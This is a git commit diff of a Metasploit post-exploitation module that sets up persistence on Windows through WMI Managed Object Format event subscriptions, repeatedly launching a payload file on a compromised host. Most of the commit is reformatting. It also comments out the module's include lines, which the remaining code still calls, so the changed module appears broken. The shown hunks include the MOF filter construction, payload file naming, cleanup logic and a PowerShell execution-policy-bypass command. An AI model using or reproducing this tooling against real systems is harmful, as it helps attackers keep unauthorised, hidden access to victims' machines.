48d08c0f8091cd4e107ace7ddfdb7b7e2a9e158d
Ighor Augusto <f0rb1dd3n@tuta.io>
2018-03-07 23:59:00 -0300

    Update mof_persistence.rb

--- modules/post/windows/manage/mof_persistence.rb
+++ modules/post/windows/manage/mof_persistence.rb
@@ -1,25 +1,22 @@
 require 'zlib'
 
-require 'msf/core'
 require 'msf/core/payload_generator'
-require 'msf/core/exploit/powershell'	
+require 'msf/core/exploit/powershell'
 require 'rex'
 require 'msf/core/post/common'
 require 'msf/core/post/file'
 require 'msf/core/exploit/exe'
 
 class MetasploitModule < Msf::Post
-  include Msf::Post::File
-  include Msf::Exploit::Powershell
-  include Exploit::EXE
-  include Msf::Post::Common
+  #include Msf::Post::File
+  #include Msf::Exploit::Powershell
+  #include Exploit::EXE
+  #include Msf::Post::Common
 
   def initialize(info={})
     super(update_info(info,
       'Name'                 => "Windows Managed Object Files Persistence via Powershell",
-      'Description'          => %q{
-	This module will attempt to use MOF to establish persistence on a machine as an alternative to the persistence meterpreter script. This will require at least local administrative rights and powershell present on the machine.
-      },
+      'Description'          => %q{This module will attempt to use MOF to establish persistence on a machine as an alternative to the persistence meterpreter script. This will require at least local administrative rights and powershell present on the machine.},
       'License'              => MSF_LICENSE,
       'Platform'             => ['win'],
       'SessionTypes'         => ['meterpreter'],
@@ -40,43 +37,43 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-	OptInt.new( 'INTERVAL', [true, 'Interval beween callbacks', 60]),
-  OptString.new('CLASSNAME', [false, 'MOF Event and CommandLine Consumer Class Name (default: random)']),
-	OptString.new('RNAME', [false, 'Name of the file that will be called by mof event (default: random)']),
-  OptString.new('FILE', [true, 'Path of the file with the payload that will be called by mof event']),
-  OptString.new('FILETYPE', [false, 'Extention of the file that will be called by mof event (default: exe)', 'exe']),
-      ], self.class)
+        OptInt.new( 'INTERVAL', [true, 'Interval beween callbacks', 60]),
+        OptString.new('CLASSNAME', [false, 'MOF Event and CommandLine Consumer Class Name (default: random)']),
+        OptString.new('RNAME', [false, 'Name of the file that will be called by mof event (default: random)']),
+        OptString.new('FILE', [true, 'Path of the file with the payload that will be called by mof event']),
+        OptString.new('FILETYPE', [false, 'Extention of the file that will be called by mof event (default: exe)', 'exe']),
+      ])
 
     register_advanced_options(
       [
         OptString.new('W_PATH',  [false, 'PATH to write temporary MOF', '%TEMP%' ]),
         OptBool.new(  'DELETE',  [false, 'Delete MOF after execution', true ]),
-        OptBool.new(  'DRY_RUN', [false, 'Only show what would be done', false ]), 
-        OptInt.new('TIMEOUT',    [false, 'Execution timeout', 15]),	
-      ], self.class)
+        OptBool.new(  'DRY_RUN', [false, 'Only show what would be done', false ]),
+        OptInt.new('TIMEOUT',    [false, 'Execution timeout', 15]),
+      ])
 
   end
- 
+
   def run
-    
+
     return 0 if ! (session.type == "meterpreter")
 
     path=""
     if datastore['W_PATH'].include? "%"
-	path1 = datastore['W_PATH']
-	path2 = path1.split("\\")
-		
-	path2.each do |i|
-		if i.include? "%"
-			i.gsub!("%","")
-			i =session.sys.config.getenv(path1)	
-		end
-		path.concat("#{i}\\")
-	end
+        path1 = datastore['W_PATH']
+        path2 = path1.split("\\")
+
+        path2.each do |i|
+                if i.include? "%"
+                        i.gsub!("%","")
+                        i =session.sys.config.getenv(path1)
+                end
+                path.concat("#{i}\\")
+        end
     else
-	path = datastore['W_PATH']
-    end 
-       
+        path = datastore['W_PATH']
+    end
+
     @arch = session.sys.config.getenv('ARCH')
 
     rexename = datastore['RNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
@@ -89,7 +86,7 @@ class MetasploitModule < Msf::Post
 
     if datastore['FILETYPE'] == 'bat'
       bin_file_name = path + "\\" + rexename + ".bat"
-    else 
+    else
       if
       bin_file_name = path + "\\" + rexename + ".exe"
       else
@@ -99,7 +96,7 @@ class MetasploitModule < Msf::Post
 
     print_status("Running MOF persistence script...\n")
     print_status("Using interval #{datastore['INTERVAL']} seconds")
-  
+
     mof_header="#pragma namespace(\"\\\\.\\root\\subscription\")\n"
     mof_filter ="instance of __EventFilter as $FILTER\n"
     mof_filter +="{\n"
@@ -152,7 +149,7 @@ class MetasploitModule < Msf::Post
 
     if datastore['DELETE']
         file.gsub!('\\', '\\\\\\')
-    	print_status("Cleaning up remnant MOF #{file}") 
+        print_status("Cleaning up remnant MOF #{file}")
         rm_f(file)
     end
 
@@ -165,7 +162,6 @@ class MetasploitModule < Msf::Post
 
      print_status("Quick removal command line: C:\\> powershell.exe -exec Bypass gwmi -namespace root\\subscription -query \"SELECT * FROM CommandLineEventConsumer WHERE Name='#{mof_class_name}'\"")
      print_status("This will only stop the MOF persistence and clean the CommandLineEventConsumer.  For a full clean, use #{@clean_up_rc}.")
-	
 
     print_good('Done!')
   end
